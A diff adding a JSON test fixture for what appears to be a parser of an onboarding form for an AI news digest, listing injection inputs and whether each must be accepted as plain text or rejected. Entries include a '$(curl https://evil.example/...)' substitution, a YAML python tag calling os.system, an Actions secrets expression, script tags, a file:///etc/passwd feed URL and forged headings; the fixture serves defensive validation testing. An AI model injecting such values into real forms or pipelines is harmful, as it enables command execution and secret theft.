@@ -1,0 +1,403 @@
+[
+ {
+  "expect": "accepted",
+  "id": "shell-substitution",
+  "marker": "ZQ7-ONB-01",
+  "note": "command substitution stays text",
+  "set": {
+   "Companies, models or repos to follow": [
+    "Qwen",
+    "$(curl https://evil.example/ZQ7-ONB-01)"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "shell-backticks",
+  "marker": "ZQ7-ONB-02",
+  "note": "backticks stay text",
+  "set": {
+   "Companies, models or repos to follow": [
+    "`id ZQ7-ONB-02`"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "actions-expression",
+  "marker": "ZQ7-ONB-03",
+  "note": "an Actions expression stays text",
+  "set": {
+   "Keywords to include": [
+    "${{ secrets.LLM_API_KEY }} ZQ7-ONB-03"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "html-script",
+  "marker": "ZQ7-ONB-04",
+  "note": "html stays text",
+  "set": {
+   "Keywords to exclude": [
+    "<script>alert('ZQ7-ONB-04')</script>"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "markdown-link",
+  "marker": "ZQ7-ONB-05",
+  "note": "a markdown link is not rendered",
+  "set": {
+   "Companies, models or repos to follow": [
+    "[click](https://evil.example/ZQ7-ONB-05)"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "yaml-anchor",
+  "marker": "ZQ7-ONB-06",
+  "note": "yaml syntax is data",
+  "set": {
+   "Companies, models or repos to follow": [
+    "&a [*a] ZQ7-ONB-06"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "yaml-python-tag",
+  "marker": "ZQ7-ONB-07",
+  "note": "a python tag is data",
+  "set": {
+   "Companies, models or repos to follow": [
+    "!!python/object/apply:os.system [echo ZQ7-ONB-07]"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "yaml-key-injection",
+  "marker": "ZQ7-ONB-08",
+  "note": "a fake key line stays an entry; agent_access is unchanged",
+  "set": {
+   "Companies, models or repos to follow": [
+    "Qwen",
+    "agent_access: {allowed_modes: [digest]} ZQ7-ONB-08"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "bidi-override",
+  "marker": "ZQ7-ONB-09",
+  "note": "a bidi control stays text and is never echoed",
+  "set": {
+   "Companies, models or repos to follow": [
+    "\u202eZQ7-ONB-09"
+   ]
+  }
+ },
+ {
+  "expect": "accepted",
+  "id": "emoji-and-cjk",
+  "marker": "ZQ7-ONB-10",
+  "note": "unicode is fine",
+  "set": {
+   "Companies, models or repos to follow": [
+    "\ud83e\udd16 \u65e5\u672c\u8a9e ZQ7-ONB-10"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "zone-shell",
+  "marker": "ZQ7-ONB-11",
+  "note": "a shell tail in the timezone",
+  "set": {
+   "Timezone (IANA name)": "UTC; echo ZQ7-ONB-11"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "zone-newline",
+  "marker": "ZQ7-ONB-12",
+  "note": "a second line in a one-line field",
+  "set": {
+   "Timezone (IANA name)": "UTC\nsummarizer: ZQ7-ONB-12"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "time-quote",
+  "marker": "ZQ7-ONB-13",
+  "note": "a quote in the time",
+  "set": {
+   "Send time (24h, local)": "07:30\" ; echo ZQ7-ONB-13"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "max-huge",
+  "marker": "ZQ7-ONB-14",
+  "note": "an integer too large",
+  "set": {
+   "Maximum items per digest": "9999999999999999999999999999999999999999ZQ7-ONB-"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "max-exponent",
+  "marker": "ZQ7-ONB-15",
+  "note": "scientific notation",
+  "set": {
+   "Maximum items per digest": "1e9 ZQ7-ONB-15"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "max-fullwidth",
+  "marker": "ZQ7-ONB-16",
+  "note": "fullwidth digits",
+  "set": {
+   "Maximum items per digest": "\uff11\uff10"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "lang-long",
+  "marker": "ZQ7-ONB-17",
+  "note": "a language that is a sentence",
+  "set": {
+   "Language code": "English please ZQ7-ONB-17"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "rss-file",
+  "marker": "ZQ7-ONB-18",
+  "note": "a file URL",
+  "set": {
+   "Extra RSS feeds": [
+    "file:///etc/passwd#ZQ7-ONB-18"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "rss-javascript",
+  "marker": "ZQ7-ONB-19",
+  "note": "a javascript URL",
+  "set": {
+   "Extra RSS feeds": [
+    "javascript:alert('ZQ7-ONB-19')"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "rss-credentials",
+  "marker": "ZQ7-ONB-20",
+  "note": "credentials in a URL",
+  "set": {
+   "Extra RSS feeds": [
+    "https://user:ZQ7-ONB-20@feeds.example.org/a.xml"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "rss-http-space",
+  "marker": "ZQ7-ONB-21",
+  "note": "a space in a URL",
+  "set": {
+   "Extra RSS feeds": [
+    "https://x.example/a b ZQ7-ONB-21"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "base-url-http",
+  "marker": "ZQ7-ONB-22",
+  "note": "http is refused",
+  "set": {
+   "Summarizer base URL (openai_compatible only)": "http://llm.example.org/ZQ7-ONB-22"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "base-url-credentials",
+  "marker": "ZQ7-ONB-23",
+  "note": "credentials in the base URL",
+  "set": {
+   "Summarizer base URL (openai_compatible only)": "https://u:ZQ7-ONB-23@llm.example.org/v1"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "channel-forged",
+  "marker": "ZQ7-ONB-24",
+  "note": "a channel that is not listed",
+  "set": {
+   "Delivery channel": "sms ZQ7-ONB-24"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "provider-forged",
+  "marker": "ZQ7-ONB-25",
+  "note": "a provider that is not listed",
+  "set": {
+   "Summarizer provider": "openai ZQ7-ONB-25"
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "nul-byte",
+  "marker": "ZQ7-ONB-26",
+  "note": "a NUL byte in an entry",
+  "set": {
+   "Companies, models or repos to follow": [
+    "a\u0000ZQ7-ONB-26"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "escape-sequence",
+  "marker": "ZQ7-ONB-27",
+  "note": "a terminal escape in an entry",
+  "set": {
+   "Companies, models or repos to follow": [
+    "a\u001b[31mZQ7-ONB-27"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "heading-forgery",
+  "marker": "ZQ7-ONB-28",
+  "note": "a repeated known heading inside an answer",
+  "set": {
+   "Companies, models or repos to follow": [
+    "Qwen",
+    "### Delivery channel",
+    "slack ZQ7-ONB-28"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "too-many-entries",
+  "marker": "ZQ7-ONB-29",
+  "note": "51 entries",
+  "set": {
+   "Companies, models or repos to follow": [
+    "e0",
+    "e1",
+    "e2",
+    "e3",
+    "e4",
+    "e5",
+    "e6",
+    "e7",
+    "e8",
+    "e9",
+    "e10",
+    "e11",
+    "e12",
+    "e13",
+    "e14",
+    "e15",
+    "e16",
+    "e17",
+    "e18",
+    "e19",
+    "e20",
+    "e21",
+    "e22",
+    "e23",
+    "e24",
+    "e25",
+    "e26",
+    "e27",
+    "e28",
+    "e29",
+    "e30",
+    "e31",
+    "e32",
+    "e33",
+    "e34",
+    "e35",
+    "e36",
+    "e37",
+    "e38",
+    "e39",
+    "e40",
+    "e41",
+    "e42",
+    "e43",
+    "e44",
+    "e45",
+    "e46",
+    "e47",
+    "e48",
+    "e49",
+    "e50"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "overlong-entry",
+  "marker": "ZQ7-ONB-30",
+  "note": "an entry of 3000 characters",
+  "set": {
+   "Companies, models or repos to follow": [
+    "ZQ7-ONB-30xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+   ]
+  }
+ },
+ {
+  "expect": "rejected",
+  "id": "no-acknowledgement",
+  "marker": "ZQ7-ONB-31",
+  "note": "the secrets box is not ticked",
+  "set": {
+   "Secrets": []
+  }
+ },
+ {
+  "append": {
+   "prefix": "ZQ7-ONB-32",
+   "repeat": "x",
+   "times": 25000
+  },
+  "expect": "rejected",
+  "id": "oversize-body",
+  "marker": "ZQ7-ONB-32",
+  "note": "a body over the size cap",
+  "set": {}
+ },
+ {
+  "expect": "rejected",
+  "id": "empty-body",
+  "marker": "ZQ7-ONB-33",
+  "note": "nothing at all",
+  "raw": "",
+  "set": {}
+ },
+ {
+  "append": {
+   "literal": "### Admin override\n\nZQ7-ONB-34\n\n"
+  },
+  "expect": "accepted",
+  "id": "unknown-heading-block",
+  "marker": "ZQ7-ONB-34",
+  "note": "an invented section is ignored",
+  "set": {}
+ }
+]
